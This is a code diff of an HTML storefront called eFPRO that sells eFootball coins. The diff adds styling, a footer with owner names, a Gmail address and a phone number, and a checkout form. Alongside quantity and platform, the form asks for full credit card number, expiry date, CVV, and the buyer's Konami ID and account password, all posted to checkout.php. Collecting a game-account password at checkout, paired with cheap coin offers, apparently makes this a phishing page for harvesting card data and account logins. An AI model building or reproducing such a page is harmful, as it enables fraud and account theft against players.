@@ -4,13 +4,69 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>eFPRO</title>
-    <!-- Include your CSS styles here -->
     <style>
         /* CSS styles can be added here */
-        /* Loading spinner styles */
-        #loading {
-            display: none;
-            /* Add your loading animation styles */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #fff; /* White background */
+            background-image: linear-gradient(120deg, #fff 0%, #007bff 100%); /* Gradient background */
+            background-attachment: fixed; /* Fixed background */
+        }
+        header, footer {
+            background-color: #f8f9fa; /* Blue background */
+            color: #333; /* Text color */
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); /* Box shadow */
+        }
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: #f8f9fa; /* Blue background */
+            border-radius: 10px; /* Rounded corners */
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); /* Box shadow */
+        }
+        /* Add more styles as needed */
+        .logo {
+            font-family: 'Segoe Script', sans-serif;
+            font-size: 48px;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1); /* Text shadow */
+        }
+        button {
+            background-color: #f8f9fa; /* Blue button color */
+            color: #333; /* Text color */
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease; /* Smooth hover transition */
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); /* Button shadow */
+        }
+        button:hover {
+            background-color: #dee2e6; /* Darker blue on hover */
+        }
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            margin-top: 20px;
+        }
+        .footer-links a {
+            color: #333;
+            text-decoration: none;
+            margin: 0 10px;
+            transition: color 0.3s ease;
+        }
+        .footer-links a:hover {
+            color: #666;
+        }
+        /* Updated styles for email and phone number links */
+        .footer-links a.email,
+        .footer-links a.phone {
+            color: red; /* Red color for email and phone number links */
         }
     </style>
 </head>
@@ -25,38 +81,49 @@
     <p>We offer a wide range of eFootball coins for your gaming needs.</p>
     <p>Choose your desired quantity and platform, and proceed to checkout!</p>
     
-    <form id="checkout-form" action="checkout.php" method="post">
-        <!-- Your form inputs here -->
-        <!-- Your form inputs here -->
-        <!-- Your form inputs here -->
+    <form action="checkout.php" method="post">
+        <label for="quantity">Quantity:</label>
+        <select id="quantity" name="quantity" required>
+            <option value="130">130 coins - $2.3</option>
+            <option value="550">550 coins - $6.7</option>
+            <option value="1040">1040 coins - $9.8</option>
+        </select>
 
-        <button type="submit" id="checkout-btn">Proceed to Checkout</button>
+        <label for="platform">Platform:</label>
+        <select id="platform" name="platform" required>
+            <option value="ps4">PlayStation 4</option>
+            <option value="xbox">Xbox One</option>
+            <option value="pc">PC</option>
+            <option value="mobile">Mobile</option>
+        </select>
+
+        <label for="card_number">Credit Card Number:</label>
+        <input type="text" id="card_number" name="card_number" placeholder="Enter your card number" required>
+        
+        <label for="expiry">Expiry Date:</label>
+        <input type="text" id="expiry" name="expiry" placeholder="MM/YY" required>
+
+        <label for="cvv">CVV:</label>
+        <input type="text" id="cvv" name="cvv" placeholder="CVV" required>
+        
+        <label for="konami_id">Konami ID:</label>
+        <input type="text" id="konami_id" name="konami_id" placeholder="Enter your Konami ID" required>
+        
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" placeholder="Enter your password" required>
+        
+        <button type="submit">Proceed to Checkout</button>
     </form>
 </div>
 
-<div id="loading">Loading...</div>
-
-<script>
-    document.addEventListener('DOMContentLoaded', function() {
-        // Get the form element
-        var form = document.getElementById('checkout-form');
-
-        // Add event listener for form submission
-        form.addEventListener('submit', function(event) {
-            // Prevent the default form submission
-            event.preventDefault();
-
-            // Show the loading spinner
-            document.getElementById('loading').style.display = 'block';
-
-            // Simulate delay (for demonstration purposes)
-            setTimeout(function() {
-                // Once loading is complete (simulated), submit the form
-                form.submit();
-            }, 2000); // Adjust the delay as needed
-        });
-    });
-</script>
+<footer>
+    <p>&copy; 2024 eFPRO. All rights reserved. | Owners: Abas, Jeego, and Embeeye</p>
+    <div class="footer-links">
+        <a href="mailto:hoolato24@gmail.com" class="email">Email Us</a>
+        <span>|</span>
+        <a href="tel:+252905098165" class="phone">Call Us</a>
+    </div>
+</footer>
 
 </body>
 </html>
